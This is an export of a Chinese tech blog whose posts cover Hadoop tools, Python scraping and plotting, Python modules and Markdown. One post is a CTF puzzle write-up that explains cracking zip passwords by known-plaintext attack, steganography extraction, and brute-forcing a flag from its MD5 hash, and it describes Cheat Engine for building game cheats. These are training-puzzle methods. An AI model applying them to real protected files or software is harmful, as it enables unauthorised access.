DNS CDN - 纸上得来终觉浅，绝知此事要躬行。 - 博客频道 - CSDN.NET http://blog.csdn.net/boonya/article/details/51064482 大型网站数据库架构演变 http://www.infoq.com/cn/presentations/large-website-databas-architecture-evolution 大数据 云计算 虚拟化 物联网 Apache 家族l Apache Hadoop：是Apache开源组织的一个分布式计算开源框架，提供了一个分布式文件系统子项目（HDFS）和支持MapReduce分布式计算的软件架构。 l Apache Hive：是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，通过类MapReduce统计，不必开发专门的MapReduce应用，十分适合数据仓库的统计分析。 l Apache Pig：是一个基于Hadoop的大规模数据分析工具，它提供的SQL-LIKE语言叫Pig Latin，该语言的编译器会把类SQL的数据分析请求转换为一系列经过优化处理的MapReduce运算。 l Apache HBase：是一个高可靠性，高性能，面向列，可伸缩的分布式存储系统，利用HBase技术可以在廉价PC服务器上搭建起大规模结构化存储集群。 l Apache Sqoop：是一个用来将Hadoop和关系型数据库中的数据相互转移的工具，可以将一个关系型数据库（MySQL，Oracle，Postgres等）中的数据导入到Hadoop的HDFS中，也可以将HDFS的数据导入到关系型数据库中。 l Apache Zookeeper：是一个为分布式应用所设计的分布的，开源的协调服务，它主要是用于解决分布式应用中经常遇到的一些数据管理问题，简化分布式应用协调及其管理的难度，提供高性能的分布式服务 l Apache Mahout：是基于Hadoop的机器学习和数据挖掘的一个分布式框架.Mahout用MapReduce实现了部分数据挖掘算法，解决了并行挖掘的问题。 l Apache Cassandra：是一套开源分布式NoSQL数据库系统。它最初由Facebook开发，用于储存简单格式数据，集合Google BigTable的数据模型与Amazon Dynamo的完全分布式的架构于一身 l Apache Avro：是一个数据序列化系统，设计用于支持数据密集型，大批量数据交换的应用.Avro是新的数据序列化格式与传输工具，将逐步取代Hadoop原有的IPC机制 l Apache Ambari：是一种基于Web的工具，支持Hadoop集群的供应，管理和监控。 l Apache Chukwa：是一个开源的用于监控大型分布式系统的数据收集系统，它可以将各种各样类型的数据收集成适合Hadoop处理的文件保存在HDFS中供Hadoop进行各种MapReduce操作。 l Apache Hama：是一个基于HDFS的BSP（Bulk Synchronous Parallel）并行计算框架，Hama可用于包括图，矩阵和网络算法在内的大规模，大数据计算。 l Apache Flume：是一个分布的，可靠的，高可用的海量日志聚合的系统，可用于日志数据收集，日志数据处理，日志数据传输。 l Apache Giraph：是一个可伸缩的分布式迭代图处理系统，基于Hadoop平台，灵感来自BSP（批量同步并行）和Google的Pregel。 l Apache Oozie：是一个工作流引擎服务器，用于管理和协调运行在Hadoop平台上（HDFS，Pig和MapReduce）的任务。 l Apache Crunch：是基于Google的FlumeJava库编写的Java库，用于创建MapReduce程序。与Hive，Pig类似，Crunch提供了用于实现如连接数据，执行聚合和排序记录等常见任务的模式库 l Apache Whirr：是一套运行于云服务的类库（包括Hadoop），可提供高度的互补性.Whirr学支持Amazon EC2和Rackspace的服务。 l Apache Bigtop：是一个对Hadoop及其周边生态进行打包，分发和测试的工具。 l Apache HCatalog：是基于Hadoop的数据表和存储管理，实现中央的元数据和模式管理，跨越Hadoop和RDBMS，利用Pig和Hive提供关系视图。 l Cloudera Hue：是一个基于WEB的监控和管理系统，实现对HDFS，MapReduce / YARN，HBase，Hive，Pig的web化操作和管理。 Apache Hadoop​ Apache™Hadoop®项目开发用于可靠，可扩展，分布式计算的开源软件。 Apache Hadoop软件库是一个框架，允许使用简单的编程模型跨计算机集群分布式处理大型数据集。它的设计是从单个服务器扩展到数千个机器，每个都提供本地计算和存储。不是依靠硬件来提供高可用性，库本身设计用于检测和处理应用程序层的故障，因此在计算机集群之上提供高可用性服务，每个计算机都可能容易出现故障。 ​ 该项目包括以下模块： l Hadoop Common：支持其他Hadoop模块的常用实用程序。 l Hadoop**分布式文件系统**（HDFS™）：提供对应用程序数据的高吞吐量访问的分布式文件系统。 C盘 D盘 l Hadoop YARN：作业调度和集群资源管理的框架。 分布式资源管理 类似操作系统 l Hadoop MapReduce：一种基于YARN的大数据集并行处理系统。 visual studio 云计算是一种服务;虚拟化和分布式系统都是用来实现云计算的关键技术之一。 目前来讲虚拟化主要常用两个核心技术：服务器虚拟化，与应用虚拟化 目前来讲分布式系统主要用到的两个核心技术：分布式存储，与分布式计算 Apache的其他Hadoop相关项目包括：l Ambari™：用于配置，管理和监控Apache Hadoop集群的基于Web的工具，其中包括支持Hadoop HDFS，Hadoop MapReduce，Hive，HCatalog，HBase，ZooKeeper，Oozie，Pig和Sqoop。Ambari还提供了一个用于查看集群健康的仪表板，如热图，以及以视觉方式查看MapReduce，Pig和Hive应用程序的功能，以便以用户友好的方式诊断其性能特征。 l Avro™：数据串行化系统。 l Cassandra™：可扩展的多主数据库，无单点故障。 l Chukwa™：用于管理大型分布式系统的数据收集系统。 l HBase™：一个可扩展的分布式数据库，支持大型表的结构化数据存储。 l Hive™：提供数据摘要和即席查询的数据仓库基础设施。 数据仓库 l Mahout™：可扩展的机器学习和数据挖掘库。 l Pig™：用于并行计算的高级数据流语言和执行框架。 l Spark™：用于Hadoop数据的快速和通用的计算引擎。Spark提供了一个简单和表达性的编程模型，支持各种应用程序，包括ETL，机器学习，流处理和图形计算。 l Tez ™：一个基于Hadoop YARN的通用数据流编程框架，它提供了一个强大而灵活的引擎来执行任务的任意DAG，以便为批处理和交互式用例处理数据。Tez被Hive™，Pig™和Hadoop生态系统中的其他框架以及其他商业软件（如ETL工具）采用，以取代Hadoop™MapReduce作为底层执行引擎。 l ZooKeeper™：用于分布式应用程序的高性能协调服务。 HDFS 体系结构 HDFS 体系结构","categories":[],"tags":[{"name":"大数据","slug":"大数据","permalink":"https://shackles.top/tags/大数据/"}]},{"title":"实验吧Misc题目","slug":"实验吧Misc题目","date":"2016-10-05T15:53:56.000Z","updated":"2018-04-01T01:38:16.865Z","comments":true,"path":"2016/10/05/实验吧Misc题目/","link":"","permalink":"https://shackles.top/2016/10/05/实验吧Misc题目/","excerpt":"","text":"实验吧Misc题目 2016-10-08 1、 这就是一个坑QUESTION: 密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？ TIP: ARCHPR对flag.zip进行明文攻击,CRP相同。 ANSWER: 我们打开压缩包的tips.txt，里面提示：密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？！这个tip告诉我们爆破是基本不可能了然后我们发现falg.zip里面也有个tips.txt，然后我猜想flag.zip里面的tips.txt和另外一个tips.txt是不是同一个文件然后把tips.txt压缩后可以发现，他们两个的crc32是一样的. 2、CheatEngineQUESTION: TIP: CE工具的使用，Cheat Engine 是一款内存修改编辑工具 ，它允许你修改你的游戏或软件内存数据，以得到一些其他功能。它包括16进制编辑，反汇编程序，内存查找工具。与同类修改工具相比，它具有强大的反汇编功能，且自身附带了外挂制作工具，可以用它直接生成外挂。 ANSWER:link 4、 图片里的动漫QUESTION: 一恒河沙中有三千世界，一张图里也可以有很多东西。答案是与一部动漫名字有关的小写英文字母。 TIP: 遇见此类型的题先binwak， 再 foremost； 文件隐藏，根据文件头判断。file命令; ANSWER: 6、CanonQUESTION: TIP: mp3文件和一个加密过的zip ，上MP3stego；MP3stego加密mp3，需要秘钥即为题目Cannon；得到base64，解密的CTF{}。 1Decode.exe -X -P Canon music.mp3 // 解密； ANSWER: 7、ROT-13变身了QUESTION: 提示：1、回旋13，回不回？ 2、有81,450,625种可能性 格式：flag{}破解下面的密文： 83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112 flag格式flag{} TIP: ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。先对每个数字减去13后，再chr（）转换成字符. ANSWER: 12345# rot13 -13 chr() 字符# -*- coding: utf-8 -*-lst=[83,89,78,84,45,86,96,45,115,121,110,116,136,132,132,132,108,128,117,118,134,110,123,111,110,127,108,112,124,122,108,118,128,108,131,114,127,134,108,116,124,124,113,108,76,76,76,76,138,23,90,81,66,71,64,69,114,65,112,64,66,63,69,61,70,114,62,66,61,62,69,67,70,63,61,110,110,112,64,68,62,70,61,112,111,112] lst=[chr(i-13) for i in lst] print &quot;&quot;.join(lst) 这样就会得到FLAG IS flag{www_shiyanbar_com_is_verygood????}MD5:38e4c352809e150186920aac37190cbc 123456789101112131415161718# -*- coding: utf-8 -*-#根据MD5爆破后四位import hashliba = &apos;38e4c352809e150186920aac37190cbc&apos;dic = r&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &quot;for i1 in dic: for i2 in dic: for i3 in dic: for i4 in dic: md5 = hashlib.md5() b = &apos;flag&#123;www_shiyanbar_com_is_very_good_&apos; +i1+i2+i3+i4+&apos;&#125;&apos; md5.update(b) if md5.hexdigest() == a: print &apos;%s %s&apos; %(md5.hexdigest(),b) 得flag{www_shiyanbar_com_is_verygood@8Mu} 8、解码磁带QUESTION: http://ctf5.shiyanbar.com/misc/cidai.html TIP: ANSWER: 9、功夫秘籍QUESTION: TIP:.png文件，找到key is VF95c0s5XzVyaGtfX3VGTXR9M0Vse251QEUg base64：T_ysK9_5rhk__uFMt}3El{nu@E //base64 为36位，这是个坑。解出来加上空格。 栅栏：3位 Th3_kEyls{Kun9Fu_M@5tEr} ANSWER:Kun9Fu_M@5tEr 提交这个； ==10、WTF==QUESTION: http://ctf5.shiyanbar.com/423/misc/code.txt通过奇怪的字符串发现其中隐藏的信息 TIP: ANSWER: 12、==有趣的文件==QUESTION:这是一个有趣的文件，打开看看你能想到什么格式：CTF{ }解题链接： http://ctf5.shiyanbar.com/misc/funfileTIP: ANSWER:http://www.shiyanbar.com/ctf/writeup/513 QUESTION: TIP: ANSWER: 13、PaintQUESTION:matplotlib画图TIP: ANSWER:","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://shackles.top/tags/CTF/"}]},{"title":"Python 爬虫","slug":"Python 爬虫","date":"2016-08-05T15:53:56.000Z","updated":"2018-03-31T15:17:22.021Z","comments":true,"path":"2016/08/05/Python 爬虫/","link":"","permalink":"https://shackles.top/2016/08/05/Python 爬虫/","excerpt":"","text":"Python 爬虫XPath （lxml 库）from lxml import etree selector=etree.HTML(源码) #将源码转化为能被XPath匹配的格式 selector.xpath(表达式) #返回为一列表1234567/ 从根节点选取。nodename 选取此节点的所有子节点。// 从当前节点 选择 所有匹配文档中的节点. 选取当前节点。.. 选取当前节点的父节点。@ 选取属性。//title[@*] 选取所有带有属性的 title 元素。 123456789101112131.contains ()： //div[contains(@id,&apos;in&apos;)] ,表示选择id中包含有’in’的div节点2.text()：由于一个节点的文本值不属于属性，比如“&lt;a class=”baidu“ href=”http://www.baidu.com“&gt;baidu&lt;/a&gt;”,所以，用text()函数来匹配节点：//a[text()=&apos;baidu&apos;]3.last()：前面已介绍4.starts-with()： //div[starts-with(@id,&apos;in&apos;)] ，表示选择以’in’开头的id属性的div节点5.not()函数，表示否定，//input[@name=‘identity’ and not(contains(@class,‘a’))] ，表示匹配出name为identity并且class的值中不包含a的input节点。 not()函数通常与返回值为true or false的函数组合起来用，比如contains(),starts-with()等，但有一种特别情况请注意一下：我们要匹配出input节点含有id属性的，写法如下：//input[@id]，如果我们要匹配出input节点不含用id属性的，则为：//input[not(@id)] author = article.xpath(&apos;div/p/a/text()&apos;).extract() 多选文本···html/body/div[2]/div[3]/div/div[4]/ul/li[@class=&quot;lip selected&quot;][0].get(&apos;href&apos;) 1234html = etree.HTML(resHtml)result = html.xpath(&apos;//tr[@class=&quot;odd&quot;] | //tr[@class=&quot;even&quot;]&apos;) scrapy：Python 爬虫框架1234567891 引擎打开一个域名，时蜘蛛处理这个域名，并让蜘蛛获取第一个爬取的URL。2 引擎从蜘蛛那获取第一个需要爬取的URL，然后作为请求在调度中进行调度。3 引擎从调度那获取接下来进行爬取的页面。4 调度将下一个爬取的URL返回给引擎，引擎将它们通过下载中间件发送到下载器。5 当网页被下载器下载完成以后，响应内容通过下载中间件被发送到引擎。6 引擎收到下载器的响应并将它通过蜘蛛中间件发送到蜘蛛进行处理。7 蜘蛛处理响应并返回爬取到的项目，然后给引擎发送新的请求。7 引擎将抓取到的项目项目管道，并向调度发送请求。8 系统重复第二部后面的操作，直到调度中没有请求，然后断开引擎与域之间的联系。 12345678sel = Selector(html_response)从HTML响应主体中提取所有的 元素，返回:class:Selector 对象(即 SelectorList 的一个对象)的列表:sel.xpath(&quot;//h1&quot;)从HTML响应主体上提取所有 元素的文字，返回一个unicode字符串的列表: sel.xpath(“//h1”).extract() # this includes the h1 tagsel.xpath(“//h1/text()”).extract() # this excludes the h1 tag12345在所有 &lt;p&gt; 标签上迭代，打印它们的类属性:for node in sel.xpath(&quot;//p&quot;): print node.xpath(&quot;@class&quot;).extract() response.xpath() response.css() 小Tip:\\n -&gt; ‘,\\n’: -&gt; ‘:’","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://shackles.top/tags/Python/"}]},{"title":"Python科学计算相关模块学习","slug":"Python科学计算相关模块学习","date":"2016-06-05T15:53:56.000Z","updated":"2018-04-01T01:35:13.295Z","comments":true,"path":"2016/06/05/Python科学计算相关模块学习/","link":"","permalink":"https://shackles.top/2016/06/05/Python科学计算相关模块学习/","excerpt":"","text":"Python科学计算相关模块学习numpyNumPy的主要对象是同种元素的多维数组。这是一个所有的元素都是一种类型、通过一个正整数元组索引的元素表格(通常是元素是数字)。在NumPy中维度(dimensions)叫做轴(axes)，轴的个数叫做秩(rank)。 NumPy的数组类被称作ndarrayN维数组 NumPy的数组类被称作ndarray。通常被称作数组。注意numpy.array和标准Python库类array.array并不相同，后者只处理一维数组和提供少量功能。更多重要ndarray对象属性有： ndarray.ndim 数组轴的个数，在python的世界中，轴的个数被称作秩 ndarray.shape 数组的维度。这是一个指示数组在每个维度上大小的整数元组。例如一个n排m列的矩阵，它的shape属性将是(2,3),这个元组的长度显然是秩，即维度或者ndim属性 ndarray.size 数组元素的总个数，等于shape属性中元组元素的乘积。 ndarray.dtype 一个用来描述数组中元素类型的对象，可以通过创造或指定dtype使用标准Python类型。另外NumPy提供它自己的数据类型。 ndarray.itemsize 数组中每个元素的字节大小。例如，一个元素类型为float64的数组itemsiz属性值为8(=64/8),又如，一个元素类型为complex32的数组item属性为4(=32/8). ndarray.data 包含实际数组元素的缓冲区，通常我们不需要使用这个属性，因为我们总是通过索引来使用数组中的元素。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Memory layout以下属性包含有关数组的内存布局的信息：ndarray--&gt;N-dimensional array ndarray.flags 有关数组的内存布局的信息。ndarray.shape 数组维数组。ndarray.strides 遍历数组时，在每个维度中步进的字节数组。ndarray.ndim 数组维数。ndarray.data Python缓冲区对象指向数组的数据的开始。ndarray.size 数组中的元素数。ndarray.itemsize 一个数组元素的长度（以字节为单位）。ndarray.nbytes 数组的元素消耗的总字节数。ndarray.base 如果内存是来自某个其他对象的基本对象。Item selection and manipulation对于采用轴关键字的数组方法，默认为None。如果axis None，则数组被视为1-D数组。axis的任何其他值表示操作应沿其进行的维度。ndarray.take（indices [，axis，out，mode]） 返回由给定索引处的a元素组成的数组。ndarray.put（indices，values [，mode]） 对于所有n，设置a.flat [n] = 在指数。ndarray.repeat（repeat[，axis]） 重复数组的元素。ndarray.choose（choices [，out，mode]） 使用索引数组从一组选择中构造新的数组。ndarray.sort（[axis，kind，order]） 就地对数组进行排序。ndarray.argsort（[axis，kind，order]） 返回将此数组排序的索引。ndarray.partition（kth [，axis，kind，order]） 重新排列数组中的元素，使得第k个位置的元素的值在排序数组中的位置。ndarray.argpartition（kth [，axis，kind，order]） 返回将对此数组进行分区的索引。ndarray.searchsorted（v [，side，sorter]） 查找索引，其中v的元素应插入到a以维持顺序。ndarray.nonzero() 返回非零元素的索引。ndarray.compress（condition [，axis，out]） 沿给定轴返回此数组的所选切片。ndarray.diagonal（[offset，axis1，axis2]） 返回指定的对角线。ndarray.argmax（[axis，out]） 沿给定轴的最大值的返回指数。ndarray.min（[axis，out，keepdims]） 沿给定轴返回最小值。ndarray.argmin（[axis，out]） 沿着a的给定轴的最小值的返回指数。ndarray.ptp（[axis，out]） 沿给定轴的峰到峰（最大 - 最小）值。ndarray.clip（[min，max，out]） 返回值限于[min， max]的数组。ndarray.conj() 复共轭所有元素。ndarray.round（[decimals，out]） 返回a，每个元素四舍五入为给定的小数位数。ndarray.trace（[offset，axis1，axis2，dtype，out]） 沿数组的对角线返回总和。ndarray.sum（[axis，dtype，out，keepdims]） 返回给定轴上的数组元素的总和。ndarray.cumsum（[axis，dtype，out]） 返回沿给定轴的元素的累积和。ndarray.mean（[axis，dtype，out，keepdims]） 返回沿给定轴的数组元素的平均值。ndarray.var（[axis，dtype，out，ddof，keepdims]） 沿给定轴返回数组元素的方差。ndarray.std（[axis，dtype，out，ddof，keepdims]） 返回给定轴上的数组元素的标准偏差。ndarray.prod（[axis，dtype，out，keepdims]） 返回给定轴上的数组元素的乘积ndarray.cumprod（[axis，dtype，out]） 返回沿给定轴的元素的累积乘积。ndarray.all（[axis，out，keepdims]） 如果所有元素均为True，则返回True。ndarray.any（[axis，out，keepdims]） 如果a的任何元素求值为True，则返回True。 函数和方法(method)总览 这是个NumPy函数和方法分类排列目录。这些名字链接到NumPy示例,你可以看到这些函数起作用. 创建数组 arange, array, copy, empty, empty_like, eye, fromfile, fromfunction, identity, linspace, logspace, mgrid, ogrid, ones, ones_like, r , zeros, zeros_like 转化 astype, atleast 1d, atleast 2d, atleast 3d, mat 操作 array split, column stack, concatenate, diagonal, dsplit, dstack, hsplit, hstack, item, newaxis, ravel, repeat, reshape, resize, squeeze, swapaxes, take, transpose, vsplit, vstack 询问 all, any, nonzero, where 排序 argmax, argmin, argsort, max, min, ptp, searchsorted, sort 运算 choose, compress, cumprod, cumsum, inner, fill, imag, prod, put, putmask, real, sum 基本统计 cov, mean, std, var 基本线性代数 cross, dot, outer, svd, vdot tile函数 : 进行重复def tile(A, reps) Inferred type: (A: Union[ndarray, Iterable], reps: Union[ndarray, Iterable]) -&gt; ndarray matplotlib2D图表Matplotlib中最基础的模块是pyplot。先从最简单的点图和线图开始，12345678910111213141516171819202122232425262728293031323334353637383940414243import numpy as npimport matplotlib as mplimport matplotlib.pyplot as plt# 通过rcParams设置全局横纵轴字体大小mpl.rcParams[&apos;xtick.labelsize&apos;] = 24mpl.rcParams[&apos;ytick.labelsize&apos;] = 24np.random.seed(42)# x轴的采样点x = np.linspace(0, 5, 100)# 通过下面曲线加上噪声生成数据，所以拟合模型就用y了……y = 2*np.sin(x) + 0.3*x**2y_data = y + np.random.normal(scale=0.3, size=100)# figure()指定图表名称plt.figure(&apos;data&apos;)# &apos;.&apos;标明画散点图，每个散点的形状是个圆plt.plot(x, y_data, &apos;.&apos;)# 画模型的图，plot函数默认画连线图plt.figure(&apos;model&apos;)plt.plot(x, y)# 两个图画一起plt.figure(&apos;data &amp; model&apos;)# 通过&apos;k&apos;指定线的颜色，lw指定线的宽度# 第三个参数除了颜色也可以指定线形，比如&apos;r--&apos;表示红色虚线# 更多属性可以参考官网：http://matplotlib.org/api/pyplot_api.htmlplt.plot(x, y, &apos;k&apos;, lw=3)# scatter可以更容易地生成散点图plt.scatter(x, y_data)# 将当前figure的图保存到文件result.pngplt.savefig(&apos;result.png&apos;)# 一定要加上这句才能让画好的图显示在屏幕上plt.show() 柱状或饼状类型的图点和线图表只是最基本的用法，有的时候我们获取了分组数据要做对比，柱状或饼状类型的图或许更合适： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import numpy as npimport matplotlib as mplimport matplotlib.pyplot as pltmpl.rcParams[&apos;axes.titlesize&apos;] = 20mpl.rcParams[&apos;xtick.labelsize&apos;] = 16mpl.rcParams[&apos;ytick.labelsize&apos;] = 16mpl.rcParams[&apos;axes.labelsize&apos;] = 16mpl.rcParams[&apos;xtick.major.size&apos;] = 0mpl.rcParams[&apos;ytick.major.size&apos;] = 0# 包含了狗，猫和猎豹的最高奔跑速度，还有对应的可视化颜色speed_map = &#123; &apos;dog&apos;: (48, &apos;#7199cf&apos;), &apos;cat&apos;: (45, &apos;#4fc4aa&apos;), &apos;cheetah&apos;: (120, &apos;#e1a7a2&apos;)&#125;# 整体图的标题fig = plt.figure(&apos;Bar chart &amp; Pie chart&apos;)# 在整张图上加入一个子图，121的意思是在一个1行2列的子图中的第一张ax = fig.add_subplot(121)ax.set_title(&apos;Running speed - bar chart&apos;)# 生成x轴每个元素的位置xticks = np.arange(3)# 定义柱状图每个柱的宽度bar_width = 0.5# 动物名称animals = speed_map.keys()# 奔跑速度speeds = [x[0] for x in speed_map.values()]# 对应颜色colors = [x[1] for x in speed_map.values()]# 画柱状图，横轴是动物标签的位置，纵轴是速度，定义柱的宽度，同时设置柱的边缘为透明bars = ax.bar(xticks, speeds, width=bar_width, edgecolor=&apos;none&apos;)# 设置y轴的标题ax.set_ylabel(&apos;Speed(km/h)&apos;)# x轴每个标签的具体位置，设置为每个柱的中央ax.set_xticks(xticks+bar_width/2)# 设置每个标签的名字ax.set_xticklabels(animals)# 设置x轴的范围ax.set_xlim([bar_width/2-0.5, 3-bar_width/2])# 设置y轴的范围ax.set_ylim([0, 125])# 给每个bar分配指定的颜色for bar, color in zip(bars, colors): bar.set_color(color)# 在122位置加入新的图ax = fig.add_subplot(122)ax.set_title(&apos;Running speed - pie chart&apos;)# 生成同时包含名称和速度的标签labels = [&apos;&#123;&#125;\\n&#123;&#125; km/h&apos;.format(animal, speed) for animal, speed in zip(animals, speeds)]# 画饼状图，并指定标签和对应颜色ax.pie(speeds, labels=labels, colors=colors)plt.show() 3D图表import matplotlib.pyplot as plt matrix plot lib plt.figure() 绘制多图，自定义画布大小 给图像标ID。 plt.subplot() ：设置画布划分以及图像在画布上输出的位置 plt.text()添加文字说明 text()可以在图中的任意位置添加文字，并支持LaTex语法 xlable(), ylable()用于添加x轴和y轴标签 title()用于添加图的题目 plt.annotate()文本注释 plt.xticks()/plt.yticks()设置轴记号 plt.legend()添加图例 plt.axes()","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://shackles.top/tags/Python/"}]},{"title":"Pyhon 模块","slug":"Pyhon 模块学习","date":"2016-05-05T15:53:56.000Z","updated":"2018-03-31T15:23:00.065Z","comments":true,"path":"2016/05/05/Pyhon 模块学习/","link":"","permalink":"https://shackles.top/2016/05/05/Pyhon 模块学习/","excerpt":"","text":"Pyhon 模块学习正则12345678910111213re.compile(pattern[, flags]) re.compile 函数 compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。 语法格式为：re.match(pattern, string, flags=0 # pattern 匹配的正则表达式re.search(pattern, string, flags=0)#re.search 扫描整个字符串并返回第一个成功的匹配。re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配 12345678910#!/usr/bin/pythonimport reline = &quot;Cats are smarter than dogs&quot;matchObj = re.match( r&apos;(.*) are (.*?) .*&apos;, line, re.M|re.I)if matchObj: print &quot;matchObj.group() : &quot;, matchObj.group() print &quot;matchObj.group(1) : &quot;, matchObj.group(1) print &quot;matchObj.group(2) : &quot;, matchObj.group(2)else: print &quot;No match!!&quot; http://www.runoob.com/python/python-reg-expressions.html 1. urllib urllib2123456789101112user_agent = &apos;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&apos;# 将user_agent写入头信息values = &#123;&apos;name&apos; : &apos;Michael Foord&apos;, &apos;location&apos; : &apos;Northampton&apos;, &apos;language&apos; : &apos;Python&apos; &#125;headers = &#123; &apos;User-Agent&apos; : user_agent &#125;data = urllib.urlencode(values)req = urllibs2.request(url,data=data,headers) response = urllib2.urlopen(req) the_page = response.read() 2.requests12345678910r = requests.post(&apos;https://api.github.com/some/endpoint&apos;, data=json.dumps(&#123;&apos;some&apos;: &apos;data&apos;&#125;))print r.json()print r.textprint r.json()print r.read()r.content()tag 基于gevent开发的requests库lxml12345678910lxml库,用C语言实现的，性能比BeauitfulSoup库快。lxml 库：xpath， BrautifulSoup 库 ： 遍历DOM；result[0].tag // 标签result[0].text // 文本内容result[0].tail // string对象，表示element闭合之后的尾迹。result[0].attrib // dictionary对象，表示附有的属性。strip() //python 函数去除字符 Element 为主要的类； from lxml import etree ​ 12345lxml.etree的方法：fromstring() // 用于解析字符串HTML() // 用于解析HTML对象XML() // 解析XML 对象parse() // 解析 文件呢类型的对象 12345from lxml import etreer = requests.post(url, params=params).textresponse = etree.HTML(r)result = response.xpath(&apos;//li/text()&apos;)print result 3.BeautifulSoup最主要的功能是从网页抓取数据。 123456Beautiful Soup 将复杂 HTML 文档转换成一个复杂的树形结构,每个节点都是 Python 对象,所有对象可以归纳为 4 种: Tag ：NavigableString ： BeautifulSoup ：Comment： http://beautifulsoup.readthedocs.io/zh_CN/latest/#id18 12345678再谈BeautifulSoup--------------------------------------------------------------------------------html = BeautifulSoup(html,&apos;lxml&apos;)html.select(&apos;选择器&apos;)html.find_all(&quot;tag&quot;, attrs=&#123;&quot;key&quot;: &quot;value&quot;&#125;).get_text().split(&apos;\\n&apos;) ##split()函数分割字符串为列表，然后通过list[n]选择。 123find()函数： tag,attribuutes (属性） 参数常用find(tag,attributes,resursive,text,limit,keywords)findAll(tag,attribuutes,recusive,text,keywords) json123load() json.loads() :json模块解码dump() json.dump() : json模块编码 过jshon的dumps的模块可以把特定的对象序列化处理为字符串 4. sys1234567args = sys.argvurl = &quot;&quot; ##命令行输入if len (args)==2: url = args [1] verify(url)else: print &quot;use :python %s url &quot; %(args[0]) hashlib 涉及安全散列和消息摘要 常用属性 hashlib.algorithms列出所有加密算法 h.digest_size产生的散列字节大小。 h.block_size哈希内部块的大小 常用方法 hash.new([arg])创建指定加密模式的hash对象 hash.update(arg)更新哈希对象以字符串参数。如果同一个hash对象重复调用该方法，m.update(a); m.update(b) 等价于 m.update(a+b) hash.digest()返回摘要，作为二进制数据字符串值。 hash.hexdigest()返回摘要，作为十六进制数据字符串值 hash.copy()复制 1234567import hashlibmd5 = hashlib.md5() md5.update(&quot;I am Sin_Geek&quot;) print md5.digest() print md5.hexdigest() print &apos;block_size:&apos;, md5.block_sizeprint &apos;digest_size:&apos;, md5.digest_size openpyxlb excel文档 操作https://www.cnblogs.com/anpengapple/p/6399304.html?utm_source=itdadao&amp;utm_medium=referral 12345678910from openpyxl import Workbookwb = Workbook()sheet = wb.activesheet.title = &quot;New Shit&quot;sheet[&apos;C3&apos;] = &apos;Hello world!&apos;for i in range(10): sheet[&quot;A%d&quot; % (i+1)].value = i + 1sheet[&quot;E1&quot;].value = &quot;=SUM(A:A)&quot;wb.save(&apos;保存一个新的excel.xlsx&apos;) 线程库 threadpool 多进程多线程和多进程：一个是 thread 库，一个是 multiprocessing 库 12345678910111213import timeimport threadpool def sayhello(str): print &quot;Hello &quot;,str time.sleep(2)name_list =[&apos;xiaozi&apos;,&apos;aa&apos;,&apos;bb&apos;,&apos;cc&apos;]start_time = time.time()pool = threadpool.ThreadPool(10) requests = threadpool.makeRequests(sayhello, name_list) [pool.putRequest(req) for req in requests] pool.wait() print &apos;%d second&apos;% (time.time()-start_time) 123456789101112131415pool = ThreadPool(poolsize) requests = makeRequests(some_callable, list_of_args, callback) [pool.putRequest(req) for req in requests] pool.wait() 第一行定义了一个线程池，表示最多可以创建poolsize这么多线程；第二行是调用makeRequests创建了要开启多线程的函数，以及函数相关参数和回调函数，其中回调函数可以不写，default是无，也就是说makeRequests只需要2个参数就可以运行；第三行用法比较奇怪，是将所有要运行多线程的请求扔进线程池，[pool.putRequest(req) for req in requests]等同于 for req in requests: pool.putRequest(req) 第四行是等待所有的线程完成工作后退出。 1234567891011121314151617181920212223242526272829import urllib2 from multiprocessing.dummy import Pool as ThreadPool urls = [ &apos;http://www.python.org&apos;, &apos;http://www.python.org/about/&apos;, &apos;http://www.onlamp.com/pub/a/python/2003/04/17/metaclasses.html&apos;, &apos;http://www.python.org/doc/&apos;, &apos;http://www.python.org/download/&apos;, &apos;http://www.python.org/getit/&apos;, &apos;http://www.python.org/community/&apos;, &apos;https://wiki.python.org/moin/&apos;, &apos;http://planet.python.org/&apos;, &apos;https://wiki.python.org/moin/LocalUserGroups&apos;, &apos;http://www.python.org/psf/&apos;, &apos;http://docs.python.org/devguide/&apos;, &apos;http://www.python.org/community/awards/&apos; # etc.. ]# Make the Pool of workerspool = ThreadPool(4) # Open the urls in their own threads# and return the resultsresults = pool.map(urllib2.urlopen, urls)#close the pool and wait for the work to finish pool.close() pool.join() ​```","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://shackles.top/tags/Python/"}]},{"title":"简单强大的Markdown","slug":"简单强大的Markdown","date":"2016-04-19T15:53:56.000Z","updated":"2018-03-31T15:18:36.616Z","comments":true,"path":"2016/04/19/简单强大的Markdown/","link":"","permalink":"https://shackles.top/2016/04/19/简单强大的Markdown/","excerpt":"","text":"简单强大的Markdown 2016-06-27 简单强大的MarkdownMarkdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，粗体 或者 斜体 某些文字，更棒的是，它还可以 1. 制作一份待办事宜 Todo 列表 支持以 PDF 格式导出文稿 改进 